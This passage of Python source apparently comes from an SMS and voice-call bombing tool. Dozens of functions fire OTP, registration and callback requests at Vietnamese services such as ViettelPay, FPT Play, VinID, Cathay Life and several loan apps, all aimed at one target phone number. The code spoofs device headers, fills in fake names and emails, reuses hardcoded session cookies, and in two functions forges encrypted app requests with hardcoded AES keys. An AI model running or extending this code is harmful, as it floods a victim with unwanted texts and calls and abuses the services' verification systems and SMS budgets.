    body = f'--{boundary}\r\ncontent-disposition: form-data; name="q"\r\nContent-Length: {len(json.dumps(json_data))}\r\n\r\n{json.dumps(json_data)}\r\n--{boundary}--\r\n'
    try:
        r = requests.post(
            "https://spj.daukhimiennam.com/api/customer/generateOTP",
            headers=headers,
            data=body,

            timeout=15,
        )
        _log("call8", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("call8", False, err=e)


def vtmoney():
    cookies = {
        "_cfuvid": "IbrAhg9ruybk5tvcyo2YDibVieT0lAMzt5HRVyDkd8U-1748153577558-0.0.1.1-604800000"
    }
    headers = {
        "host": "api8.viettelpay.vn",
        "content-type": "application/json",
        "accept": "*/*",
        "app-version": "8.8.28",
        "product": "VIETTELPAY",
        "type-os": "ios",
        "accept-encoding": "gzip;q=1.0, compress;q=0.5",
        "accept-language": "vi",
        "imei": "70B0EA3D-7FC0-45BA-8303-E83D802C004B",
        "device-name": "iPhone",
        "user-agent": "Viettel Money/8.8.28 (com.viettel.viettelpay; build:2; iOS 18.3.2) Alamofire/4.9.1",
        "os-version": "18.3.2",
        "authority-party": "APP",
    }
    headers.update(random_headers())
    try:
        r = requests.post(
            "https://api8.viettelpay.vn/customer/v2/accounts/register",
            cookies=cookies,
            headers=headers,
            json={"identityType": "msisdn", "type": "REGISTER", "identityValue": phone},
            verify=False,
        )
        _log("vtmoney", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("vtmoney", False, err=e)


def aio():
    cookies = {
        "form_key": "aPAWCBzqh0CcyXpJ",
        "PHPSESSID": "5pcdppq40anu7l2ccb2k2cajk8",
        "city_id": "1",
        "district_id": "1",
    }
    headers = {
        "accept": "*/*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://aiosmart.com.vn",
        "referer": "https://aiosmart.com.vn/customer/account/login/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }
    data = {
        "login[otp]": "",
        "login[telephone]": phone,
        "login[username]": "ChÃ³ Äáº»",
        "confirm": "on",
        "form_key": "aPAWCBzqh0CcyXpJ",
    }
    try:
        r = requests.post(
            "https://aiosmart.com.vn/advancedlogin/login/sendOtpRegister/",
            cookies=cookies,
            headers=headers,
            data=data,
        )
        _log("aio", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("aio", False, err=e)


def bibo():
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        "origin": "https://bibomart.com.vn/dang-nhap.html",
        "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    }
    try:
        r = requests.post(
            "https://prod.bibomart.net/customer_account/v2/otp/send",
            headers=headers,
            json={"phone": phone, "type": 1},
        )
        _log("bibo", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("bibo", False, err=e)


def ppppp():
    random_email = generate_random_email()
    cookies = {
        "TS01f67c5d": "0110512fd75d28cd8dca1406809047fa9a58228de78dc79d02c4c49bc535883d25523c8e55da9b48b384d5b6079c27bc2d0868d555",
        "JSESSIONID": "THOPYGZhRHw2dbp13m5nY72O.06283f0e-f7d1-36ef-bc27-6779aba32e74",
        "INITSESSIONID": "027279fa9c4b49c532cab7766a507b45",
    }
    headers = {
        "Accept": "*/*",
        "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Origin": "https://www.cathaylife.com.vn",
        "Referer": "https://www.cathaylife.com.vn/CPWeb/portal/register",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0",
        "X-Requested-With": "XMLHttpRequest",
    }
    data = {
        "phone": phone,
        "email": random_email,
        "LINK_FROM": "signUp2",
        "CUSTOMER_NAME": "John Davis",
        "memberID": "",
        "POL_HOLDER_NUM": "undefined",
        "LANGS": "vi_VN",
    }
    try:
        r = requests.post(
            "https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/sendOTP",
            cookies=cookies,
            headers=headers,
            data=data,
        )
        _log("ppppp", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("ppppp", False, err=e)


def ppppppp():
    random_email = generate_random_email()
    cookies = {
        "TS01f67c5d": "0110512fd75d28cd8dca1406809047fa9a58228de78dc79d02c4c49bc535883d25523c8e55da9b48b384d5b6079c27bc2d0868d555",
        "JSESSIONID": "THOPYGZhRHw2dbp13m5nY72O.06283f0e-f7d1-36ef-bc27-6779aba32e74",
        "INITSESSIONID": "027279fa9c4b49c532cab7766a507b45",
    }
    headers = {
        "Accept": "*/*",
        "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Origin": "https://www.cathaylife.com.vn",
        "Referer": "https://www.cathaylife.com.vn/CPWeb/portal/register",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0",
        "X-Requested-With": "XMLHttpRequest",
    }
    data = {
        "memberMap": f'{{"userName":"{random_email}","password":"123123aA@","birthday":"12/12/1999","certificateNumber":"001304056221","phone":"{phone}","email":"quadeptraai@gmail.com","LINK_FROM":"signUp2","memberID":"","CUSTOMER_NAME":"John Davis"}}',
        "OTP_TYPE": "P",
        "LANGS": "vi_VN",
    }
    try:
        r = requests.post(
            "https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/reSendOTP",
            cookies=cookies,
            headers=headers,
            data=data,
        )
        _log("ppppppp", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("ppppppp", False, err=e)


def sms2():
    if phone.startswith("0"):
        formatted = f"+84{phone[1:]}"
    else:
        formatted = phone
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json; charset=utf-8",
        "anonymous_id": "91b4b8dc-c106-4627-b89b-645e9bd27ea9",
        "x-channel": "updOMeRVjaRzLNT",
        "x-device-id": "46cca99d-a759-4e4b-a35d-dc148fe385b2",
        "X-Device-UUID": "46cca99d-a759-4e4b-a35d-dc148fe385b2",
        "X-Request-ID": "f8341c7e-4065-4f11-b1f6-a75c5792a05e",
        "unique_id": "93679d53-d542-4b81-86a5-252ebe02cd91",
        "Accept-Language": "vi",
    }
    try:
        r = requests.post(
            "https://apex.vinid.net/oneid/iam/v1/otp/sms/request",
            headers=headers,
            json={"phone_number": formatted, "is_register": True},
            timeout=15,
        )
        _log("sms2", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("sms2", False, err=e)


def sms5():
    NAME = f"{random.choice(ho)} {random.choice(ten)}"
    random_email = generate_random_email()
    headers = {
        "Content-Type": "application/json",
        "LADI_CLIENT_ID": "e1a1ba37-a6be-4487-78f8-0922c91300d4",
        "LADI_PAGE_VIEW": "7",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    }
    params = {
        "name": NAME,
        "phone": phone,
        "email": random_email,
        "branch": "HN: 107 XuÃ¢n La, XuÃ¢n Äá»nh, Báº¯c Tá»« LiÃªm [142]",
        "job_title": "Sinh viÃªn nÄm 3,4 [6]",
        "message": "",
        "brand_id": "1",
        "link_source": "https://khoahoc.ielts-fighter.com/trung-tam-ielts-v4",
        "source": "google_ads",
        "campaign_id": "72",
        "gad_source": "1",
        "gad_campaignid": "21595334625",
        "gbraid": "0AAAAAC4uUsv56SqkiCopada3pmUs3spQP",
        "gclid": "Cj0KCQiA8KTNBhD_ARIsAOvp6DK8fVt0vsu9A5vTtWCG_hdsuzeAaKcLIttHPKzHfjomfaFK0K0AT8QaAjBpEALw_wcB",
        "cart_quantity": "0",
    }
    payload = {
        "event": "PageView",
        "store_id": "5b57f38472976020da8e5611",
        "time_zone": 7,
        "domain": "khoahoc.ielts-fighter.com",
        "url": "https://khoahoc.ielts-fighter.com/thank-you",
        "ladipage_id": "6181320170f24600200bb7c7",
        "publish_platform": "LADIPAGEDNS",
        "data": [],
        "tracking_page": True,
    }
    try:
        r = requests.post(
            "https://a.ladipage.com/event", headers=headers, params=params, json=payload
        )
        _log("sms5", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("sms5", False, err=e)


def hey():
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
        "app-version": "70814",
        "authorization": "8996e28efe64d52bcea12d5165ebae17",
        "content-type": "application/json",
        "origin": "https://book.heyu.vn",
        "priority": "u=1, i",
        "referer": "https://book.heyu.vn/login",
        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0",
    }
    json_data = {
        "phone": phone,
        "regionName": None,
        "nativeVersion": 2027,
        "reqT": 1721580987444,
    }
    try:
        response = requests.post(
            "https://book.heyu.vn/api/sms/send-code",
            headers=headers,
            json=json_data,
            timeout=15,
        )

    except:
        pass


def uudai():
    NAME = f"{random.choice(ho)} {random.choice(ten)}"
    params = {
        "name": NAME,
        "phone": phone,
        "products": "Tháº©m Má»¹ Máº¯t",
        "cart_quantity": 0,
    }
    full_url = BASE_URL + "?" + urlencode(params)
    common_headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
        "Origin": "https://uudai.seoulcenter.com.vn",
        "Referer": full_url,
    }
    try:
        s = requests.Session()
        s.headers.update(common_headers)
        s.post(
            "https://a.ladipage.com/event",
            json={
                "event": "PageView",
                "store_id": "5977f59d1abc544991d43c5b",
                "time_zone": 7,
                "domain": "uudai.seoulcenter.com.vn",
                "url": full_url,
                "ladipage_id": "6985595d7beb82001297bf6c",
                "publish_platform": "LADIPAGEDNS",
                "data": [],
                "tracking_page": True,
            },
            headers={
                "Content-Type": "application/json",
                "LADI_CLIENT_ID": "d2d19e70-fbbc-4a64-6f3d-258daa7593b4",
                "LADI_PAGE_VIEW": "1",
            },
            timeout=15,
        )
        r = s.get(
            full_url,
            headers={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
            },
            timeout=15,
        )
        _log("uudai", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("uudai", False, err=e)


def otp8():
    cookies = {"next-i18next": "vi"}
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
        "origin": "https://www.weddingbook.vn",
        "referer": "https://www.weddingbook.vn/recovery/password",
        "sec-ch-ua": '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0",
    }
    try:
        r = requests.post(
            f"https://www.weddingbook.vn/api/public/authcall/+84.{phone}",
            cookies=cookies,
            headers=headers,
            timeout=25,
        )
        _log("otp8", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("otp8", False, err=e)


def call10():
    headers = {
        "Accept-Language": "vi",
        "User-Agent": "android",
        "App-Version": "2.1.2",
        "App-ID": "A18566",
        "Access-Token": "",
        "Country": "Vietnam",
        "Language": "vi_VN",
        "Host": "vaypay88.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
    }
    headers.update(random_headers())
    try:
        r = requests.get(
            "https://vaypay88.com/api/scone-app/register/otp",
            params={"phone": phone, "type": "LOGIN_OR_REGISTER", "sendType": "VOICE"},
            headers=headers,
        )
        _log("call10", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("call10", False, err=e)


def unica():
    phone_chuyen_doi = phonet(phone)
    random_email = generate_random_email()
    headers1 = {
        "Host": "id.unica.vn",
        "accept": "application/json",
        "content-type": "application/json",
        "user-agent": "Unica/1 CFNetwork/1335.0.3.4 Darwin/21.6.0",
        "accept-language": "vi-VN,vi;q=0.9",
    }
    try:
        requests.post(
            "https://id.unica.vn/api/users",
            headers=headers1,
            json={
                "full_name": "huytrrrrddf",
                "email": random_email,
                "password": "tttyyyuuu",
                "phone": phone_chuyen_doi,
            },
            verify=False,
            timeout=8,
        )
        headers2 = {**headers1}
        headers2.update(random_headers())
        r = requests.post(
            "https://id.unica.vn/api/get-pin-code",
            headers=headers2,
            json={"phone": phone_chuyen_doi},
            verify=False,
            timeout=8,
        )
        _log("unica", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("unica", False, err=e)


def debug_request():
    cookies = {
        "__sbref": "hgpyjywadlykgkoiavkyouqetxuxcpwhpxdqandf",
        "_cabinet_key": "SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDkxNDkwMTk2Ng.nD_8NLs-CZ7IqIV4JqSpmnAsPVAC0r0WuzMgua9OO1U",
    }
    headers_get = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "referer": "https://vayxanh.com/",
    }
    x_request_id = generate_request_id()
    headers_post = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json;charset=utf-8",
        "origin": "https://lk.vayxanh.com",
        "referer": f"https://lk.vayxanh.com/?phone={phone}&amount=2000000&term=7",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "x-request-id": x_request_id,
    }
    try:
        params = {
            "phone": phone,
            "amount": "2000000",
            "term": "7",
            "utm_source": "direct_vayxanh",
            "utm_medium": "organic",
            "utm_campaign": "direct_vayxanh",
            "utm_content": "mainpage_submit",
        }
        response_get = requests.get(
            "https://lk.vayxanh.com/",
            params=params,
            cookies=cookies,
            headers=headers_get,
            timeout=15,
        )
        cookies.update(response_get.cookies.get_dict())
        json_data = {
            "data": {
                "phone": phone,
                "code": "resend",
                "channel": "ivr",
            }
        }
        r_post = requests.post(
            "https://lk.vayxanh.com/api/4/client/otp/send",
            cookies=cookies,
            headers=headers_post,
            json=json_data,
            timeout=15,
        )

        _log("Vayxanh", r_post.status_code < 400, r_post.status_code)

    except Exception as e:
        _log("Vayxanh", False, err=e)


def otp5():
    device_imei = str(uuid.uuid4()).upper()
    gcm_token = f"dzaa728IrE_kkqJ5sQL6AA:APA91b{generate_random_string(100)}"
    payload = {
        "app_type": 3,
        "version_code": "250610",
        "platform": 2,
        "token": "",
        "acc": "",
        "device_imei": device_imei,
        "app_customer_type": "",
        "role_id": "",
        "soft_version": 1,
        "phone": phone,
        "gcm_device_token": gcm_token,
        "device_name": "iPhone",
        "device_os_version": "18.1",
    }
    boundary = "8xzARb1t44ub1hGtY7yvCTqHT5gy_u__cb_BGvz4RvvzDoO-tWSfycUO3BM4I9m7hs4eQu"
    body = (
        f'--{boundary}\r\ncontent-disposition: form-data; name="q"\r\n\r\n'
        f"{json.dumps(payload)}\r\n--{boundary}--\r\n"
    )
    headers = {
        "Host": "spj.daukhimiennam.com",
        "User-Agent": "G24H/250610 CFNetwork/1568.200.51 Darwin/24.1.0",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": f"multipart/form-data; boundary={boundary}",
    }
    try:
        r = requests.post(
            "https://spj.daukhimiennam.com/api/customer/generateOTP",
            headers=headers,
            data=body.encode("utf-8"),
        )
        _log("otp5", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("otp5", False, err=e)


def call1():
    def fix_b64(s):
        s = re.sub(r"[^a-zA-Z0-9+/=]", "", s)
        missing_padding = len(s) % 4
        if missing_padding:
            s += "=" * (4 - missing_padding)
        return s

    def decrypt(data_b64, key, iv):
        try:
            raw = base64.b64decode(fix_b64(data_b64))
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(raw)
            try:
                return unpad(decrypted, 16).decode("utf-8")
            except:
                return decrypted.decode("utf-8", errors="ignore").strip()
        except Exception as e:
            return f"err:{e}"

    def encrypt(data_dict, key, iv):
        js_str = json.dumps(data_dict, separators=(",", ":")).encode("utf-8")
        cipher = AES.new(key, AES.MODE_CBC, iv)
        ct_bytes = cipher.encrypt(pad(js_str, 16))
        return base64.b64encode(ct_bytes).decode("utf-8")

    key = b"QALMuZOyJUkyzoVw"
    iv = b"nNCUynBrwFMqgTUC"
    headers = {
        "Host": "keepch.catsoutofbags.com",
        "Content-Type": "application/json; charset=utf-8",
        "User-Agent": "okhttp/4.12.0",
        "nqab": "mMxsEAnmSHyMXWsP",
        "groawfq": "qdowvh",
    }
    headers.update(random_headers())
    payload = {
        "brhawjd": {
            "rvdw": "mMxsEAnmSHyMXWsP",
            "zbwpc": "android",
            "hzdajc": "1.25.21",
            "vfnmdgb": 10,
            "pjz": "com.hours.money",
            "otvlqiwf": "app",
            "wgdqu": "1697bf584f3e23536b27c31b5cb893b3",
            "xntfmn": "",
            "ydu": {
                "vjq": "samsung",
                "nnv": "9",
                "rdwiqbvt": "28",
                "yljv": "SM-S9280",
                "qesoj": "f3b8959d4cc4ed14",
                "vjpot": "5aef5e0f-43dc-427d-b0e8-f1cb4ada62e6",
            },
            "kmpnybt": 1,
            "hpiptgew": 1,
            "gdbxdcj": 1,
            "uhucyq": 1,
        },
        "twh": {"azznw": "VOICE", "kgzekcyl": phone},
    }
    service_data = encrypt(payload, key, iv)
    try:
        r = requests.post(
            "https://keepch.catsoutofbags.com/userlogin/transmit/user-text",
            json={"serviceData": service_data},
            headers=headers,
            verify=False,
        )
        _log("call1", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("call1", False, err=e)


def call2():
    def aes_gcm_encrypt(data, key, iv):
        cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
        if isinstance(data, str):
            data = data.encode("utf-8")
        ciphertext, tag = cipher.encrypt_and_digest(data)
        return base64.b64encode(iv + ciphertext + tag).decode("utf-8")

    def generate_token(android_id, key, iv):
        step1 = aes_gcm_encrypt(f"{android_id}++1", key, iv)
        timestamp = str(int(time.time() * 1000))
        return aes_gcm_encrypt(f"{step1}+{timestamp}", key, iv)

    def format_phone(p):
        clean_phone = p.strip()
        if clean_phone.startswith("0"):
            clean_phone = clean_phone[1:]
        return f"84{clean_phone}"

    android_id = hashlib.md5(str(random.random()).encode()).hexdigest()[:16]
    key = b"uK7w2ythmjfse43L"
    iv = b"\x00" * 12
    app_type = "1042"
    version = "1.2.1"
    country = "vn"
    base_url = "https://vangvay.com/biz-api/"
    send_path = "fejgk/abma/mibda"
    formatted_phone = format_phone(phone)
    params = OrderedDict()
    params["fakjok"] = app_type
    params["fpnojg"] = country
    params["fpdile"] = formatted_phone
    params["fdpaai"] = 2
    params["fafmml"] = 1
    params["fjmgcp"] = version
    json_params = json.dumps(params, separators=(",", ":"))
    enc_param = aes_gcm_encrypt(json_params, key, iv)
    enc_url = aes_gcm_encrypt(send_path, key, iv)
    wrapper = OrderedDict()
    wrapper["param"] = enc_param
    wrapper["url"] = enc_url
    json_wrapper = json.dumps(wrapper, separators=(",", ":"))
    final_payload = aes_gcm_encrypt(json_wrapper, key, iv)
    headers = {
        "Accept": "application/json",
        "appType": app_type,
        "countryCode": country,
        "token": generate_token(android_id, key, iv),
        "type": app_type,
        "User-Agent": "okhttp/5.1.0",
        "version": version,
        "Content-Type": "application/json; charset=UTF-8",
        "Connection": "Keep-Alive",
    }
    headers.update(random_headers())
    try:
        r = requests.post(base_url + send_path, data=final_payload, headers=headers)
        _log("call2", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("call2", False, err=e)


def marvay():
    headers = {
        "Content-Type": "application/json",
        "x-client-type": "phone",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    }
    data = {
        "phone": phone,
        "app_id": "266000001",
        "platform": "ios",
    }
    r = requests.post(
        "https://mvvai.marttimeassrt.com/v2/login/captcha",
        headers=headers,
        json=data,
        timeout=15,
    )
    print(f" Status: {r.status_code}")


def king11():
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
        "content-type": "application/json; charset=UTF-8",
        "origin": "https://fptplay.vn",
        "priority": "u=1, i",
        "referer": "https://fptplay.vn/",
        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0",
        "x-did": "B274C650E1693D1F",
    }
    json_data = {
        "phone": phone,
        "country_code": "VN",
        "client_id": "vKyPNd1iWHodQVknxcvZoWz74295wnk8",
    }
    try:
        response = requests.post(
            "https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=6j5x6nett8jkCfcK_qAYHg&e=1721803584&device=Opera(version%253A112.0.0.0)&drm=1",
            headers=headers,
            json=json_data,
        )

    except:
        pass


def king10():
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
        "content-type": "application/json; charset=UTF-8",
        "origin": "https://fptplay.vn",
        "priority": "u=1, i",
        "referer": "https://fptplay.vn/",
        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0",
        "x-did": "B274C650E1693D1F",
    }
    json_data = {
        "phone": phone,
        "country_code": "VN",
        "client_id": "vKyPNd1iWHodQVknxcvZoWz74295wnk8",
    }
    try:
        response = requests.post(
            "https://api.fptplay.net/api/v7.1_w/user/otp/reset_password_otp?st=oIfVfDi61oLPs9G1htsfEw&e=1721803775&device=Opera(version%253A112.0.0.0)&drm=1",
            headers=headers,
            json=json_data,
        )

    except:
        pass


def king9():
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
        "content-type": "application/json; charset=UTF-8",
        "origin": "https://fptplay.vn",
        "priority": "u=1, i",
        "referer": "https://fptplay.vn/",
        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0",
        "x-did": "B274C650E1693D1F",
    }
    json_data = {
        "phone": phone,
        "email": "",
        "country_code": "VN",
        "client_id": "vKyPNd1iWHodQVknxcvZoWz74295wnk8",
    }
    try:
        response = requests.post(
            "https://api.fptplay.net/api/v7.1_w/user/otp/resend_otp?st=f8BaG8rdfwZq825-0vCokg&e=1721803855&device=Opera(version%253A112.0.0.0)&drm=1",
            headers=headers,
            json=json_data,
        )

    except:
        pass


def king12():
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi-VN",
        "content-type": "application/json; charset=UTF-8",
        "origin": "https://booking.vinwonders.com",
        "priority": "u=1, i",
        "sec-ch-ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    }
    json_data = {
        "channel": 10,
        "UserName": phone,
        "Type": 1,
        "OtpChannel": 1,
    }
    response = requests.post(
        "https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp",
        headers=headers,
        json=json_data,
    )


def otp9():
    cookies = {
        "_cfuvid": "IbrAhg9ruybk5tvcyo2YDibVieT0lAMzt5HRVyDkd8U-1748153577558-0.0.1.1-604800000"
    }
    headers = {
        "host": "api8.viettelpay.vn",
        "content-type": "application/json",
        "accept": "*/*",
        "app-version": "8.8.28",
        "product": "VIETTELPAY",
        "type-os": "ios",
        "accept-encoding": "gzip;q=1.0, compress;q=0.5",
        "accept-language": "vi",
        "imei": "70B0EA3D-7FC0-45BA-8303-E83D802C004B",
        "device-name": "iPhone",
        "user-agent": "Viettel Money/8.8.28 (com.viettel.viettelpay; build:2; iOS 18.3.2) Alamofire/4.9.1",
        "os-version": "18.3.2",
        "authority-party": "APP",
    }
    try:
        r = requests.post(
            "https://api8.viettelpay.vn/customer/v2/accounts/register",
            cookies=cookies,
            headers=headers,
            json={"identityType": "msisdn", "type": "REGISTER", "identityValue": phone},
            timeout=20,
            verify=False,
        )
        _log("otp9", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("otp9", False, err=e)


import requests
import re


def otp10(phone):

    url = "https://ila.edu.vn/tieng-anh-cho-be/"

    static_data = {
        "_token": "1E2zdp7RyeUPUAsdnY7dL7lvzbLkAWvJX0FQQehr",
        "_session_key": "7Sy0Wy6WjNVLqdbSAz5LKjKn1mNxlRvsEUAoQ6Vy",
        "formSubmit": "formAbove",
        "phone_formAbove": phone,
        "fullname_formAbove": "KH",
        "program_formAbove": "EY-J",
        "city_id_formAbove": "20",
        "center_id_formAbove": "24",
    }

    # thá»­ gá»­i vá»i token cÅ©
    try:
        r = requests.post(url, data=static_data, timeout=10)

        if r.status_code in [200, 406]:
            print(f"â Gá»­i thÃ nh cÃ´ng (token cÅ©): {phone}")
            return True

    except Exception:
        pass

    print("â ï¸ Token cÅ© háº¿t háº¡n, Äang láº¥y token má»i...")

    try:
        session = requests.Session()

        r = session.get(url, timeout=10)

        token = re.search(r'name="_token"\s+value="([^"]+)"', r.text)
        session_key = re.search(r'name="_session_key"\s+value="([^"]+)"', r.text)

        if not token:
            print("â KhÃ´ng láº¥y ÄÆ°á»£c token")
            return False

        data = static_data.copy()

        data["_token"] = token.group(1)
        data["_session_key"] = session_key.group(1) if session_key else ""

        r = session.post(url, data=data, timeout=10)

        if r.status_code in [200, 406]:
            print(f"â Gá»­i thÃ nh cÃ´ng (token má»i): {phone}")
            return True
        else:
            print(f"â Tháº¥t báº¡i: {r.status_code}")
            return False

    except Exception as e:
        print("â Error:", e)
        return False


def vay_muon():
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
        "access-control-allow-origin": "*",
        "content-type": "application/json",
        "order-channel": "1",
        "origin": "https://nhathuoclongchau.com.vn",
        "priority": "u=1, i",
        "referer": "https://nhathuoclongchau.com.vn/",
        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
